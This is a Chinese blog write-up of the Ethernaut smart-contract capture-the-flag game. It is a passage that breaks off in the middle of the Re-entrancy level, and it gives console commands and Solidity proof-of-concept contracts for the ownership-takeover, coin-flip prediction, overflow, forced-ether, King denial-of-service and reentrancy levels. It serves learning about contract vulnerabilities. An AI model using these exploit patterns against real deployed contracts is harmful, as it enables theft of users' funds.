@@ -1,0 +1,1372 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Zeppelin Ethernaut WriteUp | ShawnXu の 小窝</title><meta name="author" content="Shawn Xu,shawn@hxzy.me"><meta name="copyright" content="Shawn Xu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Zeppelin-Ethernaut-WriteUp参考文章：感谢大佬 xuing Ethernaut WriteUp 更新到22题 Shop 本文单纯记录下自己的学（mo）习（yu）过程。 Hello Ethernaut第一关很简单，首先是教你如何去使用MetaMask浏览器扩展程序。 使用基础命令查看信息：  player ：查看自己的地址。  getBalance(player) ：查看当前">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zeppelin Ethernaut WriteUp">
+<meta property="og:url" content="https://shawnxu.me/2019/11/09/Ethernaut%20WriteUp/">
+<meta property="og:site_name" content="ShawnXu の 小窝">
+<meta property="og:description" content="Zeppelin-Ethernaut-WriteUp参考文章：感谢大佬 xuing Ethernaut WriteUp 更新到22题 Shop 本文单纯记录下自己的学（mo）习（yu）过程。 Hello Ethernaut第一关很简单，首先是教你如何去使用MetaMask浏览器扩展程序。 使用基础命令查看信息：  player ：查看自己的地址。  getBalance(player) ：查看当前">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shawnxu.me/img/11.jpg">
+<meta property="article:published_time" content="2019-11-09T03:11:11.000Z">
+<meta property="article:modified_time" content="2020-09-08T01:25:06.367Z">
+<meta property="article:author" content="Shawn Xu">
+<meta property="article:tag" content="Ethernaut">
+<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="solidity">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shawnxu.me/img/11.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://shawnxu.me/2019/11/09/Ethernaut%20WriteUp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?21618d9b00c278eb5b4bf1caa5e07c7a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Shawn Xu","link":"链接: ","source":"来源: ShawnXu の 小窝","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Zeppelin Ethernaut WriteUp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2020-09-08 09:25:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 图库</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/11.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ShawnXu の 小窝"><span class="site-name">ShawnXu の 小窝</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 图库</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Zeppelin Ethernaut WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-09T03:11:11.000Z" title="发表于 2019-11-09 11:11:11">2019-11-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-09-08T01:25:06.367Z" title="更新于 2020-09-08 09:25:06">2020-09-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>35分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Zeppelin Ethernaut WriteUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Zeppelin-Ethernaut-WriteUp"><a href="#Zeppelin-Ethernaut-WriteUp" class="headerlink" title="Zeppelin-Ethernaut-WriteUp"></a><a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/">Zeppelin-Ethernaut</a>-WriteUp</h1><p>参考文章：感谢大佬 <a target="_blank" rel="noopener" href="https://www.jianshu.com/u/2631d3e59e33">xuing</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/161d554a591c">Ethernaut WriteUp 更新到22题 Shop</a></p>
+<p>本文单纯记录下自己的学（mo）习（yu）过程。</p>
+<h2 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h2><p>第一关很简单，首先是教你如何去使用<a target="_blank" rel="noopener" href="https://metamask.io/">MetaMask浏览器扩展程序</a>。</p>
+<p>使用基础命令查看信息：</p>
+<ul>
+<li><p>player ：查看自己的地址。</p>
+</li>
+<li><p>getBalance(player) ：查看当前的以太币余额。</p>
+</li>
+<li><p>contract.abi() ：查看合约接口，即可以调用的函数。</p>
+</li>
+<li><p>help() ：查看控制台中其他可用命令。</p>
+</li>
+</ul>
+<p>解题：</p>
+<pre><code>  contract.info()
+  // &quot;You will find what you need in info1().&quot;
+  contract.info1()
+  // &quot;Try info2(), but with &quot;hello&quot; as a parameter.&quot;
+  contract.info2(&#39;hello&#39;)
+  // &quot;The property infoNum holds the number of the next info method to call.&quot;
+  contract.infoNum()
+  // 42
+  contract.info42()
+  // &quot;theMethodName is the name of the next method.&quot;
+  contract.theMethodName()
+  // &quot;The method name is method7123949.&quot;
+  contract.method7123949()
+  // &quot;If you know the password, submit it to authenticate().&quot;
+  contract.abi
+  //查看合约接口，寻找password，发现存在一个名为password的函数
+  contract.password()
+  // &quot;ethernaut0&quot;
+  contract.authenticate(&#39;ethernaut0&#39;)
+</code></pre>
+<p>点击Submit instance，第一关over。</p>
+<p>关键：</p>
+<ul>
+<li>contract.functionName() 调用合约函数</li>
+<li>contract.abi 查看函数接口</li>
+</ul>
+<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>通关要求：</p>
+<ul>
+<li><p>获得合约所有权</p>
+</li>
+<li><p>将合余额减少为0</p>
+</li>
+</ul>
+<pre><code>//withdraw函数是只能由合约拥有者才能访问的，功能是取出合约内部全部资金
+  function withdraw() public onlyOwner &#123;
+    owner.transfer(this.balance);
+  &#125;
+//fallback函数，获得合约所有权
+  function() payable public &#123;
+    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);
+    owner = msg.sender;
+  &#125;
+</code></pre>
+<p>解题：</p>
+<pre><code>//保证在执行fallBack函数时，能通过contributions[msg.sender] &gt; 0的校验
+contract.contribute(&#123;value:1&#125;)  
+//通过转账调用fallback函数。
+contract.sendTransaction(&#123;value:1&#125;)
+//将合约中的钱，全部收入囊中。
+contract.withdraw()
+</code></pre>
+<p>关键：</p>
+<ul>
+<li>fallback函数：<ul>
+<li>没有名字，不能有参数，没有返回值</li>
+<li>当调用的函数找不到时，就会调用默认的fallback函数 </li>
+<li>当我们使用<code>address.send(ether to send)</code>向某个合约直接转帐时，由于这个行为没有发送任何数据，所以接收合约总是会调用fallback函数</li>
+</ul>
+</li>
+</ul>
+<h2 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h2><p>通过要求：</p>
+<ul>
+<li>获取合约所有权</li>
+</ul>
+<pre><code>  /* constructor */
+  function Fal1out() public payable &#123;
+    owner = msg.sender;
+    allocations[owner] = msg.value;
+  &#125;
+  //具有误导作用的constructor，仔细看会发现该函数并非构造函数，其名字中有个1
+</code></pre>
+<p>解题：</p>
+<pre><code>contract.Fal1out()
+</code></pre>
+<p>就是这么简单！</p>
+<p>关键：</p>
+<ul>
+<li>构造函数<ul>
+<li>0.4.22之前的版本  使用合约名来作为构造函数 	function Fallout(){}</li>
+<li>在0.4.22版本以及之后版本，构造函数使用  constructor() public{ }来定义</li>
+<li>使用function定义构造函数，如果函数名出错，会导致本应是构造函数的函数变成一般函数，从而导致用户意外调用该函数，造成严重后果</li>
+</ul>
+</li>
+</ul>
+<p>危害详情见：<a target="_blank" rel="noopener" href="https://paper.seebug.org/630/">从以太坊”MorphToken事件”看智能合约构造函数大小写编码错误漏洞</a></p>
+<h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>通关条件：</p>
+<ul>
+<li>连续猜对10次硬币翻转结果</li>
+</ul>
+<p>很明显，直接调用函数去猜测成功率接近0，所以我们需要使用合约来获取结果，然后将正确结果传入题目合约。</p>
+<p>解题：</p>
+<p>POC1（抄的大佬的，2333333）</p>
+<pre><code>pragma solidity &gt;=0.4.18 &lt;0.6.0;
+
+import &quot;./CoinFlip.sol&quot;;
+
+contract CoinFlipPoc &#123;
+  CoinFlip expFlip;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+ 
+  constructor (address aimAddr) public &#123;
+    expFlip = CoinFlip(aimAddr);
+  &#125;
+ 
+  function hack() public &#123;
+    uint256 blockValue = uint256(blockhash(block.number-1));
+    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
+    bool guess = coinFlip == 1 ? true : false;
+    expFlip.flip(guess);
+  &#125;
+&#125;
+</code></pre>
+<p>SafeMath.sol的一个GitHub地址：<br><a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol</a></p>
+<p>直接复制一份题目源码，新建一个名为CoinFlip.sol的文字，粘贴进去。</p>
+<p>需要注意的就是solidity版本，有些SafeMath.sol使用的是0.5.0版本，所以需要修改一下CoinFlip.sol中的版本。</p>
+<p>由于每次猜测都做了if (lastHash &#x3D;&#x3D; blockValue) 判断，所以我们猜测一次后需要等到新区块生成后进行下一次猜测，不能使用for循环进行自动猜测。</p>
+<p>POC2（给大佬跪了，还是抄的）</p>
+<pre><code>let blockHash = function() &#123;
+  return new Promise(
+    (resolve, reject) =&gt; web3.eth.getBlock(&#39;latest&#39;, (error, result) =&gt; &#123;
+      if(!error)
+          resolve(result[&#39;hash&#39;]);
+      else
+          reject(error);
+    &#125;)
+  );
+&#125;
+
+contract.flip(parseInt((await blockHash())[2], 16) &gt; 8)
+</code></pre>
+<p>这种方式就不需要再去部署合约，直接在控制面版进行操作！妙啊！这就是大佬和我的区别啊！</p>
+<p>使用 contract.consecutiveWins() 可以查看连胜次数。</p>
+<pre><code>contract.consecutiveWins()
+  Promise &#123;&lt;pending&gt;&#125;
+    __proto__: Promise
+        [[PromiseStatus]]: &quot;resolved&quot;
+      [[PromiseValue]]: t
+        c: [5] //此处数字代表猜对次数
+        e: 0
+        s: 1
+      __proto__: Object
+</code></pre>
+<p>关键：</p>
+<ul>
+<li>block.blockhash (function(uint) returns (bytes32)):指定块的哈希值—— 仅可用于最新的 256 个区块且不包括当前区块  <ul>
+<li>0.4.22  版本开始已不推荐使用 ，由 blockhash(uint blockNumber) 代替</li>
+</ul>
+</li>
+</ul>
+<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>通关条件：</p>
+<ul>
+<li>获得合约所有权</li>
+</ul>
+<pre><code>if (tx.origin != msg.sender) &#123;
+    owner = _owner;
+&#125;
+</code></pre>
+<p>由上面代码可以知道，获取所有权很简单，只要tx.origin不等于msg.sender就行。</p>
+<p>简单来说就是我们调用一个合约，在由这个合约来调用题目合约。</p>
+<p>POC（一个字，抄！）</p>
+<pre><code>pragma solidity &gt;=0.4.18 &lt;0.6.0;
+
+import &quot;./Telephone.sol&quot;;
+
+contract TelephonePoc &#123;
+    
+    Telephone phone;
+    
+    function TelephonePoc(address aimAddr) public &#123;
+        phone = Telephone(aimAddr);
+    &#125;
+    
+    function attack(address _owner) public&#123;
+        phone.changeOwner(_owner);
+    &#125;
+&#125;
+</code></pre>
+<p>关键：</p>
+<ul>
+<li>tx.origin &amp; msg.sender<ul>
+<li>使用tx.origin的所有者永远不可能是一个合约</li>
+<li>使用msg.sender的所有者可能是一个合约</li>
+<li>在D -&gt; C -&gt; B -&gt; A 的简单调用链上，D为tx.origin，而B为msg.sender</li>
+</ul>
+</li>
+<li>可能导致钓鱼攻击</li>
+</ul>
+<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>通关条件：</p>
+<ul>
+<li>获取超乎想象的token</li>
+</ul>
+<p>uint类型，没有使用SafeMath，存在溢出漏洞。</p>
+<p>初始状态有20个token，向外发送21个token，即可触发向下溢出漏洞。</p>
+<p>解题：</p>
+<pre><code>contract.transfer(_address,21)
+//随便填一个地址，只要不是自己的就行
+</code></pre>
+<pre><code>(await contract.balanceOf(player)).toNumber() 
+//查看player的token余额
+</code></pre>
+<p>关键：</p>
+<ul>
+<li>溢出漏洞<ul>
+<li>加法溢出</li>
+<li>减法溢出</li>
+<li>乘法溢出</li>
+<li>使用SafeMath避免溢出漏洞</li>
+</ul>
+</li>
+</ul>
+<h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>通关条件：</p>
+<ul>
+<li>​	获取合约所有权</li>
+</ul>
+<p>​	起初以为只要把 pwn() 作为data传给Delegation就可以让它的fallback函数调用Delegate的pwn函数，事实证明，我还是too young,too simple!</p>
+<p>然鹅，大佬是这样操作的：web3.sha3(“pwn()”).slice(0,10)。</p>
+<p>思考了都没有结果，Google也没找到原因。</p>
+<p>直到看到官方文档中的：</p>
+<blockquote>
+<p> solidity官方文档</p>
+<p> 一个函数调用数据的前 4 字节，指定了要调用的函数。这就是某个函数签名的 Keccak（SHA-3）哈希的前 4 字节（高位在左的大端序）（译注：这里的“高位在左的大端序“，指最高位字节存储在最低位地址上的一种串行化编码方式，即高位字节在左） </p>
+</blockquote>
+<p>​	这才明白了web3.sha3(“pwn()”).slice(0,10)这一连串操作是在干什么。（果然还是我太菜了！）</p>
+<p>​	经过sha3加密的pwn()变成了一串16进制数，它的前4个字节就能代表pwn()这个函数，又由于前两个字符是0x,且16进制一位就是4位，所以4个字节等于32位，我们需要的字符数就是8+2&#x3D;10，所以使用slice(0,10)来截取前10个字符，去掉0x,就是我们需要的函数签名的sha-3的前四字节。</p>
+<p>​	将这个字节通过data传给合约，即可实现调用pwn()，完成！</p>
+<p>解题：</p>
+<pre><code>//sha3的返回值前两个为0x，所以要切0-10个字符。
+contract.sendTransaction(&#123;data: web3.sha3(&quot;pwn()&quot;).slice(0,10)&#125;);
+</code></pre>
+<p>关键：</p>
+<ul>
+<li>1个字节&#x3D;8位&#x3D;16进制中的2个字符</li>
+<li>ABI说明文档中规定，一个函数调用数据的前4字节，指定了要调用的函数。</li>
+</ul>
+<h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>通关目标：</p>
+<ul>
+<li>​	使合约余额大于0</li>
+</ul>
+<p>​	通过观察可以发现，题目合约中代码真可爱！（其实就是啥都没有！）</p>
+<p>​	这个时候就要复习一下向合约发送ether的方法了</p>
+<ul>
+<li><p>调用payable标识的函数：</p>
+<pre><code>pragma solidity ^0.4.0;
+contract supportPay&#123;
+  function deposit() payable&#123;
+  &#125;
+&#125;
+
+//直接调用deposit()
+//通过address.call(某个方法).value(要发送的ether)来实现的
+</code></pre>
+</li>
+<li><p>使用send直接向某地址转账: address.send(ether to send)</p>
+</li>
+<li><p>利用selfdestruct将自身所有ether发送给目标地址： selfdestruct(address);  </p>
+<p>因为目标合约没有任何能够接收ether的函数，所以我们只能强制将ether传入合约。</p>
+</li>
+</ul>
+<p>Poc：</p>
+<pre><code>pragma solidity ^0.4.18;
+
+contract Force &#123;
+    function Force() payable public &#123;        
+    &#125;
+    function ForceSendEther(address _addr) payable public&#123;
+        selfdestruct(_addr);
+    &#125;
+&#125;
+</code></pre>
+<p>实际上不止这一种方法，还有：</p>
+<ul>
+<li>创建前预先发送ether</li>
+<li>为其挖矿</li>
+</ul>
+<p>关键：</p>
+<p>​	强制发送ether的集中方式：</p>
+<ul>
+<li>通过自毁</li>
+<li>创建前预先发送ether</li>
+<li>挖矿</li>
+</ul>
+<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>通关条件：</p>
+<ul>
+<li>解锁保险库</li>
+</ul>
+<p>​	查看源码可以发现调用 unlock函数并且输入正确的密码即可解锁。</p>
+<p>​	由于合约中的所有内容对用户来说都是可见的，所以密码也应该是我们能访问到的。</p>
+<p>​	下面是大佬们的POC。</p>
+<p>​	Poc1：</p>
+<pre><code>web3.eth.getStorageAt(contract.address, 1, function(x, y)&#123;alert(web3.toAscii(y))&#125;);
+</code></pre>
+<p>​	Poc2：</p>
+<pre><code>function getStorageAt (address, idx) &#123;
+  return new Promise (function (resolve, reject) &#123;
+    web3.eth.getStorageAt(address, idx, function (error, result) &#123;
+      if (error) &#123;
+        reject(error);
+      &#125; else &#123;
+        resolve(result);
+      &#125;
+    &#125;)
+&#125;)&#125;
+
+await getStorageAt(instance, 1);
+</code></pre>
+<p>​	然后我们就可以得到密码： ”A very strong secret password :)“ </p>
+<p>解题：</p>
+<pre><code>contract.unlock(&quot;A very strong secret password :)&quot;)
+</code></pre>
+<p>​	通关后可以看到一些有用的信息</p>
+<blockquote>
+<p>重要的是要记住，将变量标记为私有只会阻止其他合同访问它。标记为私有变量和局部变量的状态变量仍可公开访问。</p>
+<p>为了确保数据是私有的，在将数据放入区块链之前需要对其进行加密。在这种情况下，解密密钥绝不应该在链上发送，因为寻找密钥的任何人都可以看到它。<a target="_blank" rel="noopener" href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/">zk-SNARK</a>提供了一种确定某人是否拥有秘密参数的方法，而不必揭露该参数。</p>
+</blockquote>
+<p>关键：</p>
+<ul>
+<li>将变量标记为私有只会阻止其他合同访问它。标记为私有变量和局部变量的状态变量仍可公开访问。</li>
+</ul>
+<h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><p>通关条件：</p>
+<ul>
+<li>发送比当前奖金还大的ether成为King</li>
+<li>提交实例后，保证King的身份不被收回</li>
+</ul>
+<p>​	第一个条件：成为king</p>
+<p>​	我们可以通过向合约发送1.1 ether 来获取King的位置</p>
+<p>​	第二个条件：保证位置不被收回</p>
+<p>​	收回King的时候，只要抛出异常，不让合约成功调用fallback函数就可以实现</p>
+<p>Poc：</p>
+<pre><code>pragma solidity ^0.4.18;
+
+contract KingPoc &#123;
+    
+    function KingPoc() payable &#123;&#125;
+    
+    address instance_address = 0x63c97a345c05de5f415d0fc5bdfa75bded2c5cfe;
+    
+    function hack() public &#123;
+        instance_address.call.value(1.1 ether)();
+    &#125;
+    
+    function () public &#123;
+        revert();
+    &#125;
+&#125;
+</code></pre>
+<p>如果你以为到这就完了，那你肯定和我一样，吃惊的发现</p>
+<pre><code>*!@#(*&amp;(@!(#*&amp;(*$&amp;!@#(*&amp;(%@)#$(!@)#(*!@)(#@!(*^#(&amp;()%*)#@(*!@)#(*&amp;    
+(╯°□°)--︻╦╤─ - - -  Oops! Looks like you haven&#39;t cracked this level just yet (╯°□°)--︻╦╤─ - - -     
+*&amp;@#$(*!@_#)(+!@)_*$(@!$_)&amp;*&amp;%!@#$_)@(#_)@_)#(@(#)&amp;(*$^#*&amp;%^#$)(#@
+</code></pre>
+<p>​	经过一番折腾（大佬的WP），最终发现gas不够！！加加加！闭着眼睛按0，测试网络不缺ether！</p>
+<p>​	更多Out of gas的相关信息，看大佬的文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/56aa08444b33">[solidity合约审计 - Out of gas的处理办法]</a></p>
+<p>关键：</p>
+<ul>
+<li>out of gas问题</li>
+<li>revert()的使用</li>
+</ul>
+<h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><p>通关条件：</p>
+<ul>
+<li>获取合约中所有资金</li>
+</ul>
+<p>​	这关的漏洞有个很大的事件——THE DAO黑客事件，可以在搜索引擎上了解了解，这次事件导致了以太坊的分叉——一次充满争议的决策。</p>
+<p>Poc:</p>
+<pre><code class="none">pragma solidity ^0.4.18;
+
+contract Reentrance &#123;
+
+  mapping(address =&gt; uint) public balances;
+
+  function donate(address _to) public payable;
+  function balanceOf(address _who) public view returns (uint balance);
+  function withdraw(uint _amount) public;
+  function() public payable &#123;&#125;
+&#125;
+
+contract ReentrancePoc &#123;
+
+    Reentrance reInstance;
+    
+    function getEther() public &#123;
+        msg.sender.transfer(address(this).balance);
+    &#125;
+    
+    function ReentrancePoc(address _addr) public&#123;
+        reInstance = Reentrance(_addr);
+    &#125;
+    function callDonate() public payable&#123;
+        reInstance.donate.value(msg.value)(this);
+    &#125;
+
+    function attack() public &#123;
